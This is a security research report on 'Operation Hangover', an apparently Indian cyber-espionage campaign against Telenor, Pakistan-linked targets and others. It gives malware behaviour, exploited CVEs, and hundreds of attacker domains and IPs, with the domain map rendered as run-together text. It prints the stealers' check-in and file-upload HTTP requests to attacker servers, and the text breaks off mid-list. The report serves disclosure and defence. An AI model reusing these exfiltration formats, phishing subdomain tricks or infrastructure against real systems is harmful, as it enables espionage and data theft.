OPERATION HANGOVER Unveiling an Indian Cyberattack Infrastructure Snorre Fagerland, Morten Kr.kvik, and Jonathan Camp Norman Shark AS Ned Moran Shadowserver Foundation Executive summary In this report we detail a cyberattack infrastructure that appears to be Indian in origin. This infrastructure has been in operation for at least three years, more likely close to four years. The purpose of this framework seems predominantly to be a platform for surveillance against targets of national security interest (such as Pakistan), but we will also show how it has been used for industrial espionage against the Norwegian telecom corporation Telenor and other civilian corporations. The name, ¡°Operation Hangover¡±, was derived from the name of one of the most frequently used malwares. The project debug path is often visible inside executable files belonging to this family. None of the information contained in the following report is intended to implicate any individual or entity, or suggest inappropriate activity by any individual or entity mentioned. Background On Sunday March 17th 2013 the Norwegian newspaper Aftenposten reported that the telecommunications giant Telenor had filed a case with Norwegian criminal police (¡°KRIPOS¡±) over what was perceived as an unlawful intrusion into their computer network. The infection was reported to have been conducted via ¡°spear phishing¡± emails sent to people in the upper tiers of management. Initially, we had no information or visibility into this case. However, after some time Norwegian CERT (NorCERT) shared some data from the event, which included md5 hashes of malicious files and information about which Command and Control servers were used. However, the data we were given acted as a starting point for more data mining, and within a short period of time it became obvious that we were seeing a previously unknown and very extensive infrastructure for targeted attacks. This paper is the result of the ensuing investigation. Timeframe The samples we have uncovered seem to have been created from approximately September 2010 until the present day. It appears 2012 was a very active year for this group, which saw escalation not only in numbers of created malware files but also in targets. There is no sign that the attacks will slow down in 2013, as we see new attacks continuously. Acknowledgments We would like to thank NorCERT, the Norwegian National Security Authority, Telenor and Telenor SOC for their assistance and cooperation during the investigation of this case. We would also like to thank ESET for graciously sharing information they were in possession of, and finally we would like to express our gratitude to the people who created our database and analysis systems. These systems enable us to do the data correlation needed to find needles in haystacks, so their creators own a large part of this paper as well. Terms used C&C, C2, CC: Command-and Control server. Typically used about the computer the malware connects to in order to report status. Drop: The online location where malware delivers stolen information. FUD: One meaning of this acronym is ¡°Fear, Uncertainty and Doubt¡±, but in the malware underground FUD means Fully UnDetectable, i.e. the program is not detected by antivirus tools. MD5: A so-called hash . i.e. a number calculated on the basis of data that identifies these with high confidence. MD5¡¯s in this paper are used to identify files. RTF: Rich Text Format, a document format SFX: Self-extracting. Executable programs that are also archives, and which extract and sometimes execute the archive content when run. Sinkholing: A technique of re-registering a domain that has previously been used for malicious purposes. By doing this, machines that are still infected connect to our computer instead of the attacker¡¯s, and we can log the connection attempts. Spear phishing: To send emails with malicious content (attachments, links, or fraudulent messages) to specific persons of particular interest. Zero day exploits: Program code to attack software vulnerabilities for which there is no patch. Telenor intrusion Initially we had no knowledge of the malware samples involved in the attack on Telenor. However, some days after the attack we received MD5 hashes of the samples used. We only found two of these samples in our own datasets, but we later directly received copies of most other samples connected with the case (Appendix A). The initial spear phishing mail contained two files as attachments . a document named ¡°220113.doc¡±, and an executable file ¡°few important operational documents.doc.exe¡±. (MD5 bd52237db47ba7515b2b7220ca64704e). This was a selfextracting (SFX) ZIP archive that contained two files, as shown below. When run, the installer will execute the included ¡°conhosts.exe¡± file and open the decoy document ¡°legal operations.doc¡±. ¡°legal operations.doc¡±and ¡°220113.doc¡± also included in the mail are identical save for their size, and are actually specially crafted RTF files designed to trigger a software vulnerability (CVE-2012-0158) in Microsoft Common Controls, typically triggered in Microsoft Word. If the vulnerability is triggered, embedded code in the document will be run. This code is encrypted, but after decryption its real purpose becomes visible: The file ¡°windwn.exe¡± is downloaded and executed by this mechanism. Fig. The behaviour of windwn.exe in Norman Malware Analyzer G2. The persistence mechanism, VBScript execution and data exfiltration is enough to trigger alerts. The files conhosts.exe (MD5 02d6519b0330a34b72290845e7ed16ab) and windwn.exe (MD5 bfd2529e09932ac6ca18c3aaff55bd79) are both minimally obfuscated Visual Basic executables. They connect to the Command and Control server wreckmove.org (188.240.47.145) via HTTP on port 80, using a peculiar and recognizable pattern: GET /flaws/snwd.php?tp=1&tg=[ID]&tv=Error[]&ts=[PLATFORM]&mt=[account]&tr=[NoFiles]&Y1Y5F2 HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C) Host: wreckmove.org Connection: Keep-Alive Other samples found connected to the case were Delphi information stealers (some highly targeted, down to individual username), file splitter tools, C++ information stealers (keyloggers, screen grabbers and file harvesters), and various other malware written in Visual Basic. The following C&C domains/IP addresses were observed used in the attack: wreckmove.org infocardiology.biz enlighten-energy.org researcherzone.net 151.237.188.167 gadgetscorner.org Telenor epilogue On the 3rd of April the attackers created another attack package and placed it on the URL http://mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz/ 01084204_Telenor_New_Satellite_Client_Agreement_30032013.zip. The package is quite similar to the first, though the decoy document is this time a Powerpoint presentation, ¡°01084204_Telenor_New_Satellite_Client_Agreement_30032013.ppt¡±. This is an apparently legitimate Telenor draft written in 2002 using a Norwegian PowerPoint installation. The included trojan downloader connects this time back to the domain torqspot.org. The attackers also created the subdomain internet-security-suite-review.toptenreviews.com.infocardiology.biz, a spoof of the real toptenreviews.com site. On this site there¡¯s what appears to be an installer for the Bitdefender antivirus product (bitdefender_tsecurity.zip, md5 62b702a15a762692eda296b0aea270f9), but the zip file contains both a real installer and a Visual Basic trojan identical to the one used against Telenor. The Telenor-related attack seems not to be over. Case expansion through related files The behaviour pattern and the file structure of known files made it possible to search internal and public databases for similar cases. The large amount of new malware being created makes it infeasible to conduct malware-related investigations of any scale without strong database support. In our case, we preserve the behavioural information of all files processed by our internal bank of Norman MAG2 automatic analysis systems. Searching internal databases for behavioural similarities: In this case, the particular VB script execution, but there¡¯s a wealth of attributes we can cluster by. There are also several public and commercial databases available for additional data mining, and Google is invaluable. The amount of malware we found through this was surprisingly large, and it became clear that the Telenor intrusion was not a single attack but part of a continuous effort to attack and compromise governments and corporations around the world. While investigating the extra cases we identified, we accidentally discovered that a number of their C&C servers contained world readable folders. We were able to navigate into these and secure the data stored there. The data contained in these folders were mainly connection logs, keylogs and other uploaded data from computers affected with malware. Many of the collected logs were from automated analysis systems belonging to security companies, but not all. An important find we did on these servers were additional malicious executables, probably meant to be served to infected users. Some of these executables were digitally signed with a certificate which was revoked in 2011: Technical and Commercial Consulting Pvt. Ltd. VeriSign Class 3 Code Signing 2010 CA Serial number: 4bf1d68e926e2dd8966008c44f95ea1c Revoked Nov 24th 2011 Searching our certificate databases we found a large number of other executables similarly signed, none of which were found to be innocent applications. Certificate database hits Case expansion through domain usage and registrations In almost all cases, the domains registered by the attackers are ¡°privacy protected¡±. This means that the registrant has paid the domain registrar to withhold identity information related to the registration. This is done almost to perfection. Another feature is that almost all websites belonging to this attacker has their robots.txt set to ¡°disallow¡± to stop them from being crawled. However, by searching historical IP data for the IP addresses of domains known to be involved we found a number of other domains likely belonging to the same infrastructure. These domains were then further verified against malware samples to ascertain valid connection to attackers. Some care needs to be taken when working with IP addresses, as there are possibilities of false correlations on, for example, domain parking IP addresses, sinkholes and webhosting servers. IP history on researcherzone.net. Source: DomainTools ..  gamezoneall.com. khalistancalling.com.rigidphotography.com.researcherzone.net.  A A A A  173.236.24.254 173.236.24.254 173.236.24.254 173.236.24.254  f00dlover.info.  A  173.236.24.254  hotbookspot.info.ns1.zerodayexploits.org.  A A  173.236.24.254 173.236.24.254  ..  A selection of passive DNS data on just one of the known IP addresses which was known to have served malware (1) Additional data may be gleaned by querying the IP addresses themselves. Many have set up a default ESMTP (mail) server on port 587/tcp, which responds with a configured banner. For example, the domain onlinestoreapp.net (used by malware MD5 a7b5fce4390629f1756eb25901dbe105) resolved to the IP address 37.59.231.161, and this happens when connecting to that IP on ESMTP: $ telnet 37.59.231.161 587 Trying 37.59.231.161... Connected to 37.59.231.161. Escape character is '^]'.220 server.enlighten energy.org ESMTP Exim 4.80.1 Sat, 23 Mar 2013 16:44:44 0400 enlighten-energy.org is another of the known bad domains used against Telenor. All of this enabled us to draw a domain map over the infrastructure (next page). This map is probably larger than shown here; there might be domains owned by the attackers that are not plotted on this map because we could not prove they were malicious, and many domains we have not found yet. Conversely, many of the domains plotted were used in attacks years ago and may never be again. webmail.juno.com.accountsserviceloginservice.info www.produkte.web.de.accountsserviceloginservice.info www.login.yahoo.com.accountsserviceloginservice.info www.insing.com.accountsserviceloginservice.info www.login.oriontelekom.rs.accountsserviceloginservice.info login.oriontelekom.rs.accountsserviceloginservice.info www.cytanet.com.accountsserviceloginservice.inforghsv.com.accountsserviceloginservice.info trustworthyinfo.com mail.wildenstein.com.accountsserviceloginservice.infowww.my.screenname.aol.com.accountsserviceloginservice.info www.google.com.accountsserviceloginservice.infogoogle.com.accountsserviceloginservice.info www.login.comcast.net.accountsserviceloginservice.infowww.mail.houseofjoyltd.com.accountsserviceloginservice.info www.ebox.co.il.accountsserviceloginservice.info www.mail.luckltd.com.accountsserviceloginservice.info ns1.dataconnects.net linkspectra.com wagonact.org downdossiersup.net softmini.netwww.mymail.bezeqint.co.il.accountsserviceloginservice.info f00dlover.info infoteller.org get.adobe.flash.softmini.net downtimesupport.com ns2.f00dlover.info ASN 19844 GORACK vstrend.orgwww.email.t-online.de.accountsserviceloginservice.info cabcardinc.net gamezoneall.com cellgame.orgmy.screenname.aol.com.accountsserviceloginservice.info webjavaupdate.comns1.f00dlover.info whostmrage.org innovatorspool.orgzerodayexploits.orgns1.adobesoftwareupdates.com184.154.254.54 divinepower.info zendossier.org smurfprotection.orgwww.mail.rediff.com.accountsserviceloginservice.info mozilaupdate.com ns1.host-stuff.net crystalrepo.orgshopingcenter.net 184.107.159.18 dosendit.com184.154.254.51www.m.youtube.com.accountsserviceloginservice.info h3helnsupp0ort.com chiccounty.netcablecomsolutions.net ns2.host-stuff.net ASN 32613 IWEB-AS woline.info mymail.bezeqint.co.il.accountsserviceloginservice.info 173.236.24.252 ns1.woline.info 173.236.24.254 thedailynewsheadline.com www.microsoft.com.chiccounty.nethost-stuff.net 173.236.24.251 zolipas.info 46.182.104.85 ns2.woline.infowebmail.stevens.edu.authenticateservicemail.accountsservicelogin.info ezyvalue.net173.236.24.250 ns2.hotbookspot.info digitalapp.orgsecure.metacafe.com-account-login-token.accountsservicelogin.info itechtoys.org46.182.104.708.22.200.44 ns1.ezyvalue.netns1.hotbookspot.info herbco.document.digitalapp.orgwww.secure.metacafe.com-account-login-token.accountsservicelogin.info mobilessoft.net fuzzyfile.net ns2.ezyvalue.nethotbookspot.info tmkstore.org macsol.org enetebookstore.com 46.182.105.40ASN 30496 COLO4 mymyntra.net spiritlog.org ns1.wvsolution.org 72.44.81.88 ns2.thedailynewsheadline.com ns2.enetebookstore.com a.abhedya.net (MANTRA TECH) ns2.zerodayexploits.org ns1.thedailynewsheadline.com crvhostia.net ns1.zerodayexploits.org ASN 20495 WEDARE deltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.orgns1.enetebookstore.com linkedin.com-callgate-6.65.2.0-rms-6.65.2.0-attachment.view.folderid.2messageid.ndi3n6rrgwnuefhoqwxgxdxmampattachmentid.20121206125116.5755maild0aa.evitalcare.org 173.199.145.140 mail.telenor.no-cookieauth.dll-getlogon-reason-0.f ormdir-1-curl-z2fowaz2f.infocardiology.biz ASN 19066 WIREDTREE filetrusty.net ASN 32475 SINGLEHOP mail-attachment.usercontent.evitalcare.org rigidphotography.com184.154.217.250 internet-security-suite-review.toptenreviews.com.infocardiology.bizwebmicrosoftupdate.net 46.182.105.41 skylarzone.org bluebird-restaurant.co.uk.infocardiology.bizappinsecurity.com esnucleus.org mail.google.com-attachments.mail.u-01.infocardiology.biz currentnewsstore.com cr3ator01.net 96.30.46.216 msfileshare.net 173.236.117.205 ozonerim.netmsoftweb.com 173.236.68.99 visordan.org jerrycoper.org evitalcare.orgftp.currentnewsstore.com rackitupstorenew.net joyfulhalloween.com ns1.evitalcare.org serverrr.com slamburger.net searchports.infocryptoanalysis.net 46.182.105.60 46.182.105.43 ns2.evitalcare.orgcallvoipnow.com ns1.naclpro.orgcasinoaffiliatepartners.net ns1.securedocx.info141.8.225.7 worldtourismnews.info ns2.naclpro.orglifelogs.orgsupportanswer.net testerspoint.info tollmart.org softwaresupdates.info naclpro.org 141.8.224.25 89.207.135.242 vkspoke.org www.mobilesoftwaremanagement.info ASN 40034 CONFLUENCEsochglobal.net packetwarden.net mobiltechsoft.org 46.182.104.83login.yahoo.com-config-verify2.woline.info softservices.org wizcheck.org 69.43.161.180 inforguide.org motsoul.orgmobilesoftwaremanagement.info 89.207.135.239 wizsplit.org tulip.net.inforguide.org influxlog.orgASN 22489 CASTLE-ACCESS picasa-album.com pharmamkting.euASN 49544 INTERACTIVE3D69.43.161.179 elementspro.org bbc-news.com.influxlog.org188.165.148.70 codetesters.org 188.165.148.68 89.207.135.61209.85.51.152 khalistancalling.com infocardiology.biz mail.download.influxlog.org maxtourguide.info 89.207.135.120 ns1.infocardiology.biz 174.120.28.61ns1.maxtourguide.info ASN 21844 THEPLANET securedmx.net ns2.infocardiology.biz ns2.knowledgepower.info espressoday.org ns1.knowledgepower.info www.espressoday.orgns2.maxtourguide.info xylotech.org workinglab.org shoppingspawn.com ns1.sportswomen.biz tradeobjective.netpicasa-album.netliveupdatesonline.netzeusagency.net 37.221.166.36www.shoperstock.com megafairclub.org newsgroupupdate.com ns2.sportswomen.biz outgateway.comdigitooldeals.net analysishunter.org 37.221.166.42 synergyrealsolutions.net shoperstock.com sportswomen.biz 37.221.166.15 wolfensteinx.net ns2.go-jobs.net myvoipp0wer.com 94.185.81.153 www.analysishunter.org 37.221.166.47 mailoff.org 37.221.166.9fasttrackagent.netns1.go-jobs.net supertechnoclub.com go-jobs.net rockingdevil.net ns1.esbasis.info joymailserver.org 37.221.166.48 176.31.65.124 37.221.166.8fistoffury.net ns2.esbasis.infons1.secuina.net 176.31.53.166 mail.joymailserver.org ASN 39743 VOXILITY176.31.65.125 37.221.166.49 176.31.53.165 176.31.65.126secuina.net 176.31.53.167 shopingcard.net ns1.zonalship.org smackdownfanclub.eu tourtime.org mobilemyown.info ns2.zonrow.org 37.221.166.5337.221.166.7178.32.75.197 176.31.65.127 ns1.newamazingfacts.com ns1.authserv.org ns1.ezservicecenter.org 178.32.75.196 176.31.4.128 footwallfanclub.com ns2.newamazingfacts.com researchhunter.org 37.221.166.55ENRC-targeted malware178.32.75.195 176.31.4.129 webmailaccountservicemail.info 37.221.166.61ns2.ezservicecenter.org 37.221.166.58hardwaregeeks.eu armordesigns.com.webmail-login.php.web-mail-services.infons2.wearwellgarments.eu 178.32.75.194 fitnessapproval.org ezservicecenter.org 178.32.75.193 calling4you.com customerpbr.com worksmartplay.com176.31.79.56 176.31.4.130 ns1.matrixtriology.com google.com.acount.database.updates.services.web-mail-services.info sports-interaction.net denismoble.info ns1.wearwellgarments.eu ns1.alreadytrue.com 176.31.79.51 ns1.justdialforu.com ns1.oscarneves.org wearwellgarments.eu ns2.alreadytrue.com 178.33.214.194 176.31.79.49 176.31.79.50 178.32.75.192 lynberrg.com advnotifier.com ns1.solraise.infomgclog.commildstone.net alreadytrue.com 178.33.210.30 ASN 16276 OVH 176.31.79.48 c0mpany4u.net sendsh33p.com config-login.com global-blog.net devilreturns.comcobrapub.com netmosol.info 188.95.48.99 cppblog.net178.33.154.49 37.59.175.130 ns1.sendsh33p.com ftp.devilreturns.comtest.enciris.eu 178.33.154.51 37.59.208.94 cheetah4u.net ns2.sendsh33p.com heavenaffiliates.info docsforum.info deltadegger.net nvidiaupdate.netidsconline.net37.59.231.161 n00b4u.com bkltmc.com178.33.154.52opensourceforum.eu 5.39.97.58 cloudone-opsource.com hangoutgroups.net ftp.nvidiaupdate.net secure-s.com 5.39.97.57 serviceagent.us178.33.154.53 kyzosune.net 109.235.49.158CME phishing attemptknight-quest.com 109.235.49.157 109.235.49.188ASN 57172 GLOBALLAYERweb-mail-services.info new-agency.usfonografia.pl 178.33.187.78 5.39.36.56 onlinestoreapp.net cmegroups.net keepawayfromfire.com mailexservices.com serviaccive.com 109.235.49.148 www.fonografia.pl 178.33.187.77 5.39.36.57 oliveglobals.com 109.235.49.147 net4speed.net109.235.49.193islamic-teacher.org 5.39.36.58 ns1.pickmail.orgyou-post.net crestboard.org 178.33.187.76 anoniemvolmacht.com ftp.net4speed.net 178.33.187.75 109.235.49.43store-fb.net 5.39.36.59 shopping-hub12.com ns1.zoninfo.org 109.235.49.235 voip-e.net 178.33.187.74 5.39.36.60 onestop-shops.com traderspace.org ns2.vlogserv.org livesunshine.info 5.39.36.61 viewerstalk.org Telenor intrusion 109.235.49.236enlighten-energy.org ns1.kjmailserv.org 94.185.81.1525.39.11.72 gnuvisor.comservice-secure.net 178.33.154.54 shopie.net support-tech.info mailservicesupport.org 109.235.50.191 reliable-global.net trend-mico.net evolvingdesk.org ns1.forest-fire.net cupzon.org178.33.131.34 ymadmin.net 109.235.50.215 help-e.net educatediary.org callersview.org cmxgrp.net 94.185.81.151 109.235.50.233 martcas.orgns2.forest-fire.net ftp.forest-fire.netmail.myorderbox.org re-buke.comfb-time.net ns2.chronicleserv.org matewiz.org frameworkup.org spstack.org178.32.75.198 forest-fire.net 78.46.169.168 ns1.chronicleserv.org ASN 47869 NETROUTING mpale.orgpics-bucket.net mujahidtarana.com centstat.org78.46.129.194 151.237.188.167 www.facebook.com-l0gin.php.mstl0giintocpassiive-trrue.contiinue-2fsiignin3factiion.handle.siignin3dtrrue26featture3dprromo.siignin26nl-en.us-idtmpl.sso.chronicleserv.org ezxen.orgsecure-solution.net chroniclesupport.net ns1.servwh.orgfile-easy.net hotupdates.com.sockzon.orgshare-home.net 176.61.140.119 logstat.info 109.235.50.246 fapize.com ritualpoint.org ns1.brandsons.net racmania.net omg-pics.net momate.net 88.198.86.168 46.4.187.60 news-report.sockzon.orgns1.hackerscouncil.com ASN 24940 HETZNER78.46.129.193 geonet.org.sockzon.orgns2.hackerscouncil.com ns2.brandsons.net www.facebook.com-l0giin.php.mstl0giintocpassiive-trrue.contiinue-2fsiignin3factiion.handle.siignin3dtrrue26featture3dprromo.siignin26nl-en.us-idtmpl.sso.supersolus.org ns2.sockzon.org braninfall.net ns1.sockzon.orgASN 57972 WEBEXXPURTS addoup.com continuelogs.infons1.braninfall.net supersolus.org sockzon.org88.198.86.172 ns1.continuelogs.info46.4.215.38 hifisure.orgns2.braninfall.net ns1.supersolus.org ns2.continuelogs.info csfserver.com ns2.supersolus.org mobiappword.com brandsons.net ns1.link-live.net109.235.51.50 onlinewebmail.net ns1.logserv.orgns2.s0pp0rtdesk.com hangovergroup.com.coolservice.continuelogs.infohostmypc.net ns1.line-web.net109.235.51.153ns1.s0pp0rtdesk.com server721-hans.de-nservers.de.continuelogs.infoaccount.istpumpenunddosiertechnik.de.continuelogs.info ns1.racrage.infoASN 58272 LEADERTELECOMBV sh3llypunk.com s0pp0rtdesk.com m.ymail.com.continuelogs.info ns1.ozoneparty.infowww.server721.han.de.nsserver.de.continuelogs.info www.mlogin.ymail.com.continuelogs.info184.82.180.105Bumi PLC intrusion ns2.serialxbox.orgaccounts.yandex.ru.continuelogs.info184.22.69.109 ns1.directionmico.org 31.214.169.86 www.alintiqad-newsonline.blogspot.com.continuelogs.info 109.235.51.100 secure-copy.com ns1.osonline.info 141.101.239.128 accounts.facbook.com.continuelogs.info ns1.ctswebup.infomcosine.org199.71.212.183 login.live.com.continuelogs.infoaccounts.yutube.com.continuelogs.info cpbatch.org ns1.xmailserv.orgosservices.info ASN 21788 NOC blogpublication.org hycoxcable.com ASN 197043 WEBTRAFFIC privatemoneyblog.orglinxauth.org 109.235.51.51 parrotcatcher.com devinmartin.netstarmobnetservice.net nlsec.org ns1.parrotcatcher.com amaxgrp.net myfilestuff.net ns2.parrotcatcher.comalr3ady.net 64.120.135.137 linked-in.c0m.srcm-ail.info.srccail.com securingyourself.net 31.214.169.87add-on-update.com ftp.alr3ady.net ftp.braninfall.net 213.5.65.20 l0gin.y0utube.acc0unts.srccail.commegamediafile.com scrm-ail.infoASN 20860 IOSMARTftp.r3gistration.net 213.5.65.24 jasminjorden.com srccail.com acc0unts.g00gle.c0m.srccail.com systoolsonline.org ns2.srccail.com l0gin.faceb0ok.com.srccail.com mosglobe.org ns1.dmzone.info ns1.srccail.comr3gistration.net 213.5.65.31 ns1.pajerolive.com sonificaton.comfilesconnect.info we-tour.net openhostingtalk.com 213.5.65.223 spidercom.info 95.154.237.11 l0gin.yaho0.c0m.srccail.comns2.pajerolive.com server003.comopendocs.info nexterchk.net 37.46.127.78 213.5.71.20 connectopen.info bmcmail.org kungfu-panda.info fileshreader.net easyslidesharing.netaddon-updates.com linkedin.com-uas.login-submit.account.session-full.login-3a5077708027557787984-csrftoken.buildyourinfo.org37.46.127.79 37.46.127.81 213.5.71.24 173.224.215.230 starsoel.org ns2.programmersheavengroup.com newamazingfacts.com ns1.kungfu-panda.infogoogle.accountservice.adminassistance.net approvalclub.org ns1.programmersheavengroup.com 79.142.64.34 188.241.115.127 buildyourinfo.org 79.142.64.32 213.5.71.26 ns2.kungfu-panda.info wakeupindian.net216.24.204.245server006.com adminassistance.netprogrammersheavengroup.com 216.24.202.100 ftp.kungfu-panda.infoPorsche-targeted malware 37.46.127.77 213.5.71.27 servorder.org infraswap.org37.46.127.76 bluecreams.commobnetserver.com avatarfanclub.com216.24.204.243 199.71.212.164 ns1.matrixfanclub.net taraanasongs.comopendocxsupport.net pajerolive.com 213.5.71.28filesassociate.net 79.142.64.36 ns2.matrixfanclub.net 89.45.249.136 mobiletechspa.org clamerword.net 74.117.62.181ns1.doc-files.info ftp.matrixfanclub.net 89.45.249.129 89.45.249.139 ritownship.net ASN 40676 PSYCHZ chkpoint.infonitr0rac3.com 213.5.71.31 worldcitycenter.net smclog.org 74.117.62.170 bbupdate.net saboresnativos.net zonalon.org wreckmove.orgvall3y.com 89.45.249.208 79.142.64.37 89.45.249.41downfilesup.com shreadersupport.net 37.46.127.75 199.119.203.85appworldblackberry.info s3rv1c3s.net mobileappsupport.com i-dim.net clienttreasury.net 188.240.47.145 torqspot.org31.3.155.106 79.142.64.39 foxypredators.com wedzon.org ASN 39756 ROHOSTWAY199.119.203.86 199.119.203.103com-mailservice.com 188.240.47.220 researchwork.org hycoxweb.org 199.119.203.102ns1.foxypredators.com ASN 14361 HOPONE primaaltus.org 31.3.154.117 www.foxypredators.com mailssh.infoASN 51430 ALTUSHOST 188.241.113.27periodtable.eumy.screename.aol.com.mjtag.org 31.3.154.116 ns2.foxypredators.com hangoutshop.net mailtechsolutions.org ns1.mjtag.org 79.142.64.47 leicesterhigh.eu 188.241.114.160ftp.s3rv1c3s.net servicesonlinesupportinfo.com ns2.mjtag.org mysharpens.com 66.148.67.20 starcrunch.org piegauz.net mjtag.org 188.241.117.163 avandtotalsecurity.comcrowcatcher.net filesforum.net 95.143.42.217 tow3r.info ns2.speedaccelator.com matrixfanclub.net internet-security-suite-review.toptenreviews.com.avandtotalsecurity.com79.142.64.49 ns1.speedaccelator.com 173.233.80.147ASN 31147 INLINE-AS dexlab.info 31.3.154.115 79.142.64.97 speedaccelator.com worldread.net16.net analogwiz.org 95.143.42.195 researcherzone.net 31.3.154.114 79.142.78.76 random123.site11.com 173.233.80.146 173.233.80.152 79.142.64.98 95.143.42.218 mobileappworld.info 79.142.78.79 bikefanclub.info accounts.you-tube.com.analogwiz.org79.142.64.99 gauzpie.com starshome.comeze.com31.3.154.113 vkverbal.org79.142.64.177 173.233.80.145 shopertock.net 31.3.154.111 79.142.78.80 neverforget1984.org ASN 40244 TURNKEY workspacecz.net opnsrc.netcoolhostingwebspace.com ns1.shopertock.net 31.3.154.110 heritage-society.com 31.170.161.56 autowidge.org79.142.64.17879.142.78.83 facebook.comaccountsserviceloginservicemail2.serviceaccountloginservicemail.info 173.233.85.134 zonalsky.org mexchange.info ns2.shopertock.net 79.142.78.101 31.170.161.136 ns1.stretcherservices.net google.comaccountsserviceloginservicemailen.serviceaccountloginservicemail.info 79.142.64.181 ns1.activetalk.org 31.170.162.23 www.mexchange.info mailcache.info ns2.activetalk.org 79.142.78.102 79.142.64.183 94.102.49.55 ns2.stretcherservices.net easyhost-ing.comlogin.live.com.mailcache.info activetalk.org 79.142.78.107 79.142.78.120 sped0m00d.com serviceaccountloginservicemail.info ASN 47583 HOSTINGER applehostpoint.info m.ymail.com.mailcache.info redgolfclub.info pizzapalace.orgnovelseller.org endemol.com.mailcache.info 79.142.78.109 mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info79.142.78.111 94.102.49.56 stretcherservices.net 79.142.78.110 unisafeservice.org 79.142.78.112 follow-ship.com google.com.accountsserviceloginservicemaileng.serviceaccountloginservicemail.infoaccounts.ymail.com.mailcache.info mktserv.info youtube.com.accountsserviceloginservicemail.serviceaccountloginservicemail.infofiservtech.org ASN 29073 ECATEL 94.102.49.199gxongame.info youtube.comaccountsserviceloginservicemail2.serviceaccountloginservicemail.info mozarting.comns1.gxongame.info easternsoft.org gadgetscorner.org ASN 16265 LEASEWEB imagebar.org 94.102.49.20191.214.45.187 65.75.243.251ns2.gxongame.info servetools.org 94.102.55.80 109.203.110.103plus.go0gle.com.servicel0gin.gxongame.info ns2.competitveedge.org 75.127.91.16ASN 36352 COLOCROSSING 75.127.91.118ASN 16626 GNAXNETwww.go0gle.com-serviicelogiin.autthserv.gxongame.info ns1.competitveedge.org global-internet.info login.facebook.com-confg.verify.login.src-ym.mailcache.info ASN 17054 CONTINENTAL 95.211.131.144 94.102.49.202 signaturedz.com ASN 10487 SIMPLENET 75.127.111.100 groupskm.info hintover.com competitveedge.org ftp.global-internet.infomakecmag.info 94.102.49.203 ASN 29550 SIMPLYTRANSITASN 14627 ASVITAL ASN 57858 FIBERGRID 94.102.49.20475.127.111.143 systemcrack.com 216.188.26.235 192.210.203.181 199.204.248.107 8.23.224.90 viragenonline.com systemupd.com 5.34.242.129 extrememachine.org pfv6jyg1rdo9ptku.mxsvr.netwondersofworld.eu undertaker.no-ip.org autowid.com secureplanning.net Above: Domain map of the attack infrastructure. Yellow and orange nodes constitute domains, where the orange have been verified malicious and yellow are likely malicious. Blue nodes are IP addresses, and purple are autonomous systems (AS). Green nodes are domains that are not part of any attack pattern, but are interesting in this context. Red nodes show connections to known or likely attacks.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                                                          13Exploits Whereas other targeted attack actors often rely extensively on the use of software exploits to plant their malware, this is rarely done by this attack group. As far as we can tell they are only using known vulnerabilities; no zero day attacks. Documents The first exploit we observed was included in the RTF files used in the Telenor attack. The exploit in question was CVE-2012-0158, a very common vulnerability to exploit. The actual document is binary very similar to other documents (51ee31f234db61b488647915f8d7d4c8, 00978e4b81ac577f328d6add75d0890e, 17a31d1075ebce41ba48a9efacb79d28...) which have been used in other targeted attacks by these threat actors. The shellcode contains a date check, which means it will stop working after a certain date. In the Telenor case, the date was February 16th 2013, and in the most recent variations the timeout date is set to May 21nd 2013. If the exploit is triggered before the timeout date the shellcode does two different things: . Posts system info (machinename, timezone, ID, running processes) to a PHP script residing on the website random123.site11.com. . Downloads and executes an executable from remote sites. We have seen softmini.net, www.infocardiology.biz, www.getmedia.us, www.technopenta.org, and autowidge.org used for this. . The executables downloaded have usually themselves been downloaders. In a couple of cases we have observed final payload to be Dark Comet, a well-known backdoor trojan, but unusual for this group to use. Web When we investigated the attacker domain structure we found more exploit code. This time it was implemented as a script in the main web page of the domain you-post.net. The exploit is this time CVE.2012-4792, an Internet Explorer vulnerability. When it triggers it downloads and runs a malicious executable from the domain softmini.net; also the domain used by two of the three documents mentioned above. Softmini.net seems to be a hub for exploitcode; its subdomain get.adobe.flash.softmini.net contains an active Java exploit (CVE-2012-0422) which attempts to install the same trojan as the IE exploit above. The Smackdown downloaders Most of the first stage malware we¡¯ve seen used in attacks are variants of Smackdown, a large family of Visual Basic downloaders which for the most part seem to be written by a person calling himself ¡°Yash¡± or ¡°Yashu¡±. These have evolved over time and are using different levels of obfuscation on text strings. Typically the trojan begins by uploading system information to a PHP script on the C&C server. The attacker can decide separately which infected machine should receive additional malware. The second stage malware is usually Hanove but other malware families are also used. Different text obfuscations in a Smackdown ¡°miNaPro¡± downloader. Reversed strings, character code encoding and inserting garbage ¡®%¡¯ characters. The HangOver malware, aka Hanove The second stage malware are often variants of HangOver, information stealers written in C++. They appear to be written over a common framework as many internal functions are identical, but overall functionality can vary quite a bit from one subtype to another. The first versions of these may have been based on code from an innocent backup utility as the word ¡°backup¡± is often present. Hanove Uploaders recursively scan folders looking for files to upload. What kind of files they look for are usually defined in resources as an extension list, and these lists vary. Here are a few examples: *.doc;*.xlxs;*.docx;*.rtf *.doc;*.xlxs;*.docx;*.rtf;*.jpg;*.ppt;*.pps;*.pdf;*.xlx *.doc;*.xlsx;*.docx;*.rtf;*.pdf;*.xls;*.ppt;*.txt;*.inp;*.kmz;*.pps;*.uti Hanove keyloggers set up keyboard hooks or polls to capture keypresses and log these to a text file. Some variants capture other data as well, such as clipboard content, screenshots, titles of open windows and content of browser edit fields. Timed events are set up to upload the data to the remote server. The stolen data are uploaded to remote servers by FTP or HTTP. A typical HTTP request looks like this: POST /up.php HTTP/1.1 Content-Type: multipart/form-data; boundary=F39D45E70395ABFB8D8D2BFFC8BBD152 User-Agent: EMSFRTCBVD Host: remotedomain.com Content-Length: 5050 Cache-Control: no-cache --F39D45E70395ABFB8D8D2BFFC8BBD152 Content-Disposition: form-data; name="uploaddir" subfolder/%username-machinename%/C/ --F39D45E70395ABFB8D8D2BFFC8BBD152 UserAgent strings vary between versions. The following have been seen in connection with this family: EMSCBVDFRT, EMSFRTCBVD, FMBVDFRESCT, DSMBVCTFRE, 